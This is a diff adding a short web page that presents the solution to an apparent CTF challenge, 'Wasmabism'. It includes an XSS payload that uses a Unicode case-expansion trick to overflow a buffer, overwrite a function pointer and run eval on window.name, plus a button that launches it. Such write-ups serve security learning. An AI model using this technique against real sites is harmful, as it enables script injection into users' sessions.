@@ -1,0 +1,50 @@
+<html>
+
+<head>
+  <style>
+    nav span {
+      padding-right: 10px;
+    }
+
+    body {
+      font-family: system, -apple-system, "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Helvetica", "Lucida Grande", "Arial", sans-serif;
+      padding: 0 10px;
+      line-height: 1.4;
+      font-size: 16px;
+      color: #111;
+    }
+
+    h1,
+    h2,
+    h3 {
+      line-height: 1.0;
+    }
+  </style>
+</head>
+
+<body style="margin: auto; max-width: 650px">
+  <div style="margin-top: 30px; height: 40px">
+    <h1 style="float: left; margin: 0; padding-right: 10px">Wasmabism Solution</h1>
+  </div>
+  <hr>
+  <ol>
+    <li>Find a Unicode character such that when <code>.toLowerCase</code> is called on it, it expands to 2 characters instead of 1.</li>
+    <li>Use this character to bypass the length check and exploit the buffer overflow to overwrite <code>funcPtr</code>.</li>
+    <li>Set the function pointer to point to <code>censor</code> as the function to be called, bypassing the XSS check.</li>
+  </ol>
+  <p>
+    <a href="https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/wasmabism"
+      target="_blank">Full Solution</a>
+    | <a href="/">Home</a>
+  </p>
+
+  <button onclick="exploit()">Run Expoit</button>
+  <script>
+    const exploit = () => {
+      window.open(
+        "/wasmabism/?note=<iframe onload=eval(window.name)>%C4%B0%C4%B0%C4%B0%C4%B0%C4%B0%C4%B0%C4%B0aa%02",
+        `alert(document.domain)`
+      )
+    }
+  </script>
+</body>
